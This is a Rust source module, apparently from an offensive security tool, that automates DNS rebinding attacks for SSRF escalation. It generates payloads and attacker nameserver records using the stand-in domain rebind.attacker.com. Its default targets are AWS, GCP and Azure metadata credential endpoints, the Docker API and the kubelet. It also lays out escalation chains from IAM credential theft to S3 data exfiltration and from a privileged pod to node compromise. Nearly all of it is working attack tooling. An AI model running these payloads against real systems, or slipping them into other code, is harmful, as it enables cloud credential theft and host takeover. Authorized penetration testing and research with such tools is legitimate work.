use std::fmt;
use std::net::{IpAddr, Ipv4Addr};

// DNS rebinding attack automation for SSRF chain escalation.
//
// DNS rebinding exploits the gap between DNS resolution and HTTP
// connection. The attack flow:
//
// 1. Attacker controls a DNS name (e.g., `evil.attacker.com`)
// 2. First resolution → attacker's public IP (passes SSRF validation)
// 3. Application opens connection to the resolved IP
// 4. Second resolution (after TTL=0 expiry) → internal IP (127.0.0.1,
//    169.254.169.254, 10.x.x.x)
// 5. Application follows redirect or makes second request → hits internal
//    service
//
// This module generates:
// - DNS rebinding payloads with configurable first/second IPs
// - TTL manipulation strategies
// - Race condition timing for DNS cache poisoning
// - Integration payloads for SSRF chains (cloud metadata, internal APIs)
// - Multiple rebinding techniques (A record flip, CNAME chain, DNS pinning bypass)

/// DNS rebinding technique variant.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum RebindingTechnique {
    ARecordFlip,
    CnameChain,
    MultipleARecords,
    Ipv6Mapped,
    TimeBasedFlip,
    SubdomainWildcard,
}

impl fmt::Display for RebindingTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ARecordFlip => write!(f, "A-record-flip"),
            Self::CnameChain => write!(f, "CNAME-chain"),
            Self::MultipleARecords => write!(f, "multiple-A-records"),
            Self::Ipv6Mapped => write!(f, "IPv6-mapped"),
            Self::TimeBasedFlip => write!(f, "time-based-flip"),
            Self::SubdomainWildcard => write!(f, "subdomain-wildcard"),
        }
    }
}

/// Target internal service for the rebind destination.
#[derive(Debug, Clone)]
pub struct RebindTarget {
    pub ip: IpAddr,
    pub port: u16,
    pub service: InternalService,
    pub path: String,
}

/// Known internal services reachable via DNS rebinding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum InternalService {
    AwsMetadata,
    GcpMetadata,
    AzureMetadata,
    DockerApi,
    KubernetesApi,
    Localhost,
    InternalNetwork,
    LinkLocal,
}

impl fmt::Display for InternalService {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::AwsMetadata => write!(f, "AWS-IMDS"),
            Self::GcpMetadata => write!(f, "GCP-metadata"),
            Self::AzureMetadata => write!(f, "Azure-IMDS"),
            Self::DockerApi => write!(f, "Docker-API"),
            Self::KubernetesApi => write!(f, "Kubernetes-API"),
            Self::Localhost => write!(f, "localhost"),
            Self::InternalNetwork => write!(f, "internal-network"),
            Self::LinkLocal => write!(f, "link-local"),
        }
    }
}

/// Configuration for DNS rebinding attack generation.
#[derive(Debug, Clone)]
pub struct RebindConfig {
    pub attacker_ip: IpAddr,
    pub attacker_domain: String,
    pub techniques: Vec<RebindingTechnique>,
    pub targets: Vec<RebindTarget>,
    pub ttl_values: Vec<u32>,
    pub dns_server_port: u16,
}

impl Default for RebindConfig {
    fn default() -> Self {
        Self {
            attacker_ip: IpAddr::V4(Ipv4Addr::new(1, 2, 3, 4)),
            attacker_domain: "rebind.attacker.com".to_string(),
            techniques: vec![
                RebindingTechnique::ARecordFlip,
                RebindingTechnique::MultipleARecords,
                RebindingTechnique::Ipv6Mapped,
                RebindingTechnique::TimeBasedFlip,
                RebindingTechnique::CnameChain,
                RebindingTechnique::SubdomainWildcard,
            ],
            targets: default_targets(),
            ttl_values: vec![0, 1, 5, 30],
            dns_server_port: 53,
        }
    }
}

/// A generated DNS rebinding payload.
#[derive(Debug, Clone)]
pub struct RebindPayload {
    pub technique: RebindingTechnique,
    pub hostname: String,
    pub first_resolution: IpAddr,
    pub second_resolution: IpAddr,
    pub ttl: u32,
    pub target_service: InternalService,
    pub request_url: String,
    pub expected_path: String,
    pub description: String,
}

/// DNS zone record for the attacker-controlled nameserver.
#[derive(Debug, Clone)]
pub struct DnsZoneRecord {
    pub name: String,
    pub record_type: DnsRecordType,
    pub value: String,
    pub ttl: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DnsRecordType {
    A,
    Aaaa,
    Cname,
    Txt,
}

impl fmt::Display for DnsRecordType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::A => write!(f, "A"),
            Self::Aaaa => write!(f, "AAAA"),
            Self::Cname => write!(f, "CNAME"),
            Self::Txt => write!(f, "TXT"),
        }
    }
}

/// Result of a rebinding attempt analysis.
#[derive(Debug, Clone)]
pub struct RebindResult {
    pub payload: RebindPayload,
    pub success: bool,
    pub reached_internal: bool,
    pub response_from_internal: Option<String>,
    pub timing_ms: u64,
    pub dns_queries_observed: usize,
}

/// Finding from DNS rebinding testing.
#[derive(Debug, Clone)]
pub struct RebindFinding {
    pub technique: RebindingTechnique,
    pub target_service: InternalService,
    pub severity: RebindSeverity,
    pub description: String,
    pub evidence: String,
    pub chain_potential: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum RebindSeverity {
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for RebindSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Low => write!(f, "Low"),
            Self::Medium => write!(f, "Medium"),
            Self::High => write!(f, "High"),
            Self::Critical => write!(f, "Critical"),
        }
    }
}

/// DNS rebinding attack generator.
pub struct DnsRebindEngine {
    config: RebindConfig,
    request_counter: usize,
}

impl DnsRebindEngine {
    pub fn new(config: RebindConfig) -> Self {
        Self {
            config,
            request_counter: 0,
        }
    }

    pub fn config(&self) -> &RebindConfig {
        &self.config
    }

    /// Generate all rebinding payloads across techniques and targets.
    pub fn generate_payloads(&mut self) -> Vec<RebindPayload> {
        let mut payloads = Vec::new();

        for target in self.config.targets.clone() {
            for technique in self.config.techniques.clone() {
                for &ttl in &self.config.ttl_values.clone() {
                    let payload = self.build_payload(&target, technique, ttl);
                    payloads.push(payload);
                }
            }
        }

        payloads
    }

    /// Generate DNS zone records for the attacker's nameserver.
    pub fn generate_zone_records(&self) -> Vec<DnsZoneRecord> {
        let mut records = Vec::new();

        records.push(DnsZoneRecord {
            name: self.config.attacker_domain.clone(),
            record_type: DnsRecordType::A,
            value: self.config.attacker_ip.to_string(),
            ttl: 0,
        });

        for target in &self.config.targets {
            let subdomain = format!(
                "{}.{}",
                service_subdomain(target.service),
                self.config.attacker_domain,
            );

            records.push(DnsZoneRecord {
                name: subdomain.clone(),
                record_type: DnsRecordType::A,
                value: target.ip.to_string(),
                ttl: 0,
            });

            if let IpAddr::V4(v4) = target.ip {
                let mapped = format!("::ffff:{}", v4);
                records.push(DnsZoneRecord {
                    name: format!("v6.{subdomain}"),
                    record_type: DnsRecordType::Aaaa,
                    value: mapped,
                    ttl: 0,
                });
            }
        }

        records
    }

    /// Generate timing payloads for race-condition DNS rebinding.
    pub fn generate_race_payloads(
        &mut self,
        target: &RebindTarget,
        burst_size: usize,
    ) -> Vec<RebindPayload> {
        let mut payloads = Vec::new();

        for i in 0..burst_size {
            let hostname = format!(
                "race-{i}-{}.{}",
                service_subdomain(target.service),
                self.config.attacker_domain,
            );
            self.request_counter += 1;
            payloads.push(RebindPayload {
                technique: RebindingTechnique::TimeBasedFlip,
                hostname: hostname.clone(),
                first_resolution: self.config.attacker_ip,
                second_resolution: target.ip,
                ttl: 0,
                target_service: target.service,
                request_url: format!(
                    "http://{hostname}:{port}{path}",
                    port = target.port,
                    path = target.path,
                ),
                expected_path: target.path.clone(),
                description: format!(
                    "Race burst {}/{burst_size}: TTL=0 flip to {}",
                    i + 1,
                    target.ip,
                ),
            });
        }

        payloads
    }

    /// Analyze rebinding results and produce findings.
    pub fn analyze_results(&self, results: &[RebindResult]) -> Vec<RebindFinding> {
        let mut findings = Vec::new();

        for result in results {
            if !result.success {
                continue;
            }

            let severity = if result.reached_internal {
                match result.payload.target_service {
                    InternalService::AwsMetadata
                    | InternalService::GcpMetadata
                    | InternalService::AzureMetadata => RebindSeverity::Critical,
                    InternalService::DockerApi | InternalService::KubernetesApi => {
                        RebindSeverity::Critical
                    }
                    InternalService::Localhost => RebindSeverity::High,
                    InternalService::InternalNetwork => RebindSeverity::High,
                    InternalService::LinkLocal => RebindSeverity::Medium,
                }
            } else {
                RebindSeverity::Low
            };

            let chain = chain_potential(result);

            findings.push(RebindFinding {
                technique: result.payload.technique,
                target_service: result.payload.target_service,
                severity,
                description: format!(
                    "DNS rebinding via {} reached {} ({})",
                    result.payload.technique,
                    result.payload.target_service,
                    result.payload.second_resolution,
                ),
                evidence: result.response_from_internal.clone().unwrap_or_default(),
                chain_potential: chain,
            });
        }

        findings
    }

    /// Check if a URL's hostname resolves to a suspicious internal IP
    /// after initial validation passed.
    pub fn detect_rebind_opportunity(hostname: &str, resolved_ips: &[IpAddr]) -> bool {
        for ip in resolved_ips {
            if is_internal_ip(ip) {
                return true;
            }
        }
        let _ = hostname;
        false
    }

    /// Generate DNS pinning bypass payloads for browsers/runtimes that
    /// cache DNS at the socket level.
    pub fn generate_pinning_bypass(&mut self, target: &RebindTarget) -> Vec<RebindPayload> {
        let mut payloads = Vec::new();

        let hostname = format!(
            "pin-{}.{}",
            service_subdomain(target.service),
            self.config.attacker_domain,
        );
        self.request_counter += 1;

        payloads.push(RebindPayload {
            technique: RebindingTechnique::ARecordFlip,
            hostname: hostname.clone(),
            first_resolution: self.config.attacker_ip,
            second_resolution: target.ip,
            ttl: 0,
            target_service: target.service,
            request_url: format!(
                "http://{hostname}:{port}{path}",
                port = target.port,
                path = target.path,
            ),
            expected_path: target.path.clone(),
            description: "DNS pinning bypass: force new socket after TTL expiry".into(),
        });

        let alt_hostname = format!(
            "pin-alt-{}.{}",
            service_subdomain(target.service),
            self.config.attacker_domain,
        );
        self.request_counter += 1;

        payloads.push(RebindPayload {
            technique: RebindingTechnique::SubdomainWildcard,
            hostname: alt_hostname.clone(),
            first_resolution: self.config.attacker_ip,
            second_resolution: target.ip,
            ttl: 0,
            target_service: target.service,
            request_url: format!(
                "http://{alt_hostname}:{port}{path}",
                port = target.port,
                path = target.path,
            ),
            expected_path: target.path.clone(),
            description: "Wildcard subdomain: each unique subdomain gets fresh DNS lookup".into(),
        });

        payloads
    }

    fn build_payload(
        &mut self,
        target: &RebindTarget,
        technique: RebindingTechnique,
        ttl: u32,
    ) -> RebindPayload {
        self.request_counter += 1;
        let seq = self.request_counter;

        let hostname = format!(
            "{technique_prefix}-{seq}-{service}.{domain}",
            technique_prefix = technique_prefix(technique),
            service = service_subdomain(target.service),
            domain = self.config.attacker_domain,
        );

        let (first, second) = match technique {
            RebindingTechnique::ARecordFlip => (self.config.attacker_ip, target.ip),
            RebindingTechnique::MultipleARecords => (self.config.attacker_ip, target.ip),
            RebindingTechnique::Ipv6Mapped => {
                let mapped = match target.ip {
                    IpAddr::V4(v4) => {
                        let octets = v4.octets();
                        IpAddr::from([
                            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xff, octets[0], octets[1],
                            octets[2], octets[3],
                        ])
                    }
                    IpAddr::V6(v6) => IpAddr::V6(v6),
                };
                (self.config.attacker_ip, mapped)
            }
            RebindingTechnique::CnameChain => (self.config.attacker_ip, target.ip),
            RebindingTechnique::TimeBasedFlip => (self.config.attacker_ip, target.ip),
            RebindingTechnique::SubdomainWildcard => (self.config.attacker_ip, target.ip),
        };

        let url = format!(
            "http://{hostname}:{port}{path}",
            port = target.port,
            path = target.path,
        );

        let description = format!(
            "{technique} rebind: {first} → {second} (TTL={ttl}) targeting {service}",
            service = target.service,
        );

        RebindPayload {
            technique,
            hostname,
            first_resolution: first,
            second_resolution: second,
            ttl,
            target_service: target.service,
            request_url: url,
            expected_path: target.path.clone(),
            description,
        }
    }
}

fn default_targets() -> Vec<RebindTarget> {
    vec![
        RebindTarget {
            ip: IpAddr::V4(Ipv4Addr::new(169, 254, 169, 254)),
            port: 80,
            service: InternalService::AwsMetadata,
            path: "/latest/meta-data/iam/security-credentials/".to_string(),
        },
        RebindTarget {
            ip: IpAddr::V4(Ipv4Addr::new(169, 254, 169, 254)),
            port: 80,
            service: InternalService::GcpMetadata,
            path: "/computeMetadata/v1/instance/service-accounts/default/token".to_string(),
        },
        RebindTarget {
            ip: IpAddr::V4(Ipv4Addr::new(169, 254, 169, 254)),
            port: 80,
            service: InternalService::AzureMetadata,
            path: "/metadata/instance?api-version=2021-02-01".to_string(),
        },
        RebindTarget {
            ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            port: 2375,
            service: InternalService::DockerApi,
            path: "/containers/json".to_string(),
        },
        RebindTarget {
            ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            port: 10250,
            service: InternalService::KubernetesApi,
            path: "/pods".to_string(),
        },
        RebindTarget {
            ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            port: 80,
            service: InternalService::Localhost,
            path: "/".to_string(),
        },
    ]
}

fn technique_prefix(technique: RebindingTechnique) -> &'static str {
    match technique {
        RebindingTechnique::ARecordFlip => "flip",
        RebindingTechnique::CnameChain => "cname",
        RebindingTechnique::MultipleARecords => "multi",
        RebindingTechnique::Ipv6Mapped => "v6map",
        RebindingTechnique::TimeBasedFlip => "time",
        RebindingTechnique::SubdomainWildcard => "wild",
    }
}

fn service_subdomain(service: InternalService) -> &'static str {
    match service {
        InternalService::AwsMetadata => "aws",
        InternalService::GcpMetadata => "gcp",
        InternalService::AzureMetadata => "azure",
        InternalService::DockerApi => "docker",
        InternalService::KubernetesApi => "k8s",
        InternalService::Localhost => "local",
        InternalService::InternalNetwork => "internal",
        InternalService::LinkLocal => "link",
    }
}

fn is_internal_ip(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => {
            v4.is_loopback()
                || v4.is_private()
                || v4.is_link_local()
                || v4.octets()[..2] == [169, 254]
                || v4.octets() == [0, 0, 0, 0]
        }
        IpAddr::V6(v6) => v6.is_loopback() || is_ipv4_mapped_private(v6),
    }
}

fn is_ipv4_mapped_private(v6: &std::net::Ipv6Addr) -> bool {
    let segments = v6.segments();
    if segments[0..5] == [0, 0, 0, 0, 0] && segments[5] == 0xffff {
        let octets = v6.octets();
        let v4 = Ipv4Addr::new(octets[12], octets[13], octets[14], octets[15]);
        v4.is_loopback() || v4.is_private() || v4.is_link_local() || v4.octets()[..2] == [169, 254]
    } else {
        false
    }
}

fn chain_potential(result: &RebindResult) -> Vec<String> {
    let mut chains = Vec::new();

    match result.payload.target_service {
        InternalService::AwsMetadata => {
            chains.push("SSRF → DNS rebind → AWS IMDS → IAM credentials → lateral movement".into());
            chains.push("Extract IAM role → enumerate S3 buckets → data exfiltration".into());
        }
        InternalService::GcpMetadata => {
            chains.push(
                "SSRF → DNS rebind → GCP metadata → service account token → API access".into(),
            );
        }
        InternalService::AzureMetadata => {
            chains.push(
                "SSRF → DNS rebind → Azure IMDS → managed identity token → resource access".into(),
            );
        }
        InternalService::DockerApi => {
            chains.push(
                "SSRF → DNS rebind → Docker API → container create → host mount → RCE".into(),
            );
            chains.push("List containers → exec into container → pivot to host".into());
        }
        InternalService::KubernetesApi => {
            chains.push("SSRF → DNS rebind → kubelet API → pod listing → secret extraction".into());
            chains.push("Create privileged pod → mount host filesystem → node compromise".into());
        }
        InternalService::Localhost | InternalService::InternalNetwork => {
            chains.push(
                "SSRF → DNS rebind → internal service discovery → further exploitation".into(),
            );
        }
        InternalService::LinkLocal => {
            chains.push(
                "SSRF → DNS rebind → link-local service → metadata or config exposure".into(),
            );
        }
    }

    chains
}

#[cfg(test)]
#[path = "dns_rebinding_test.rs"]
mod tests;
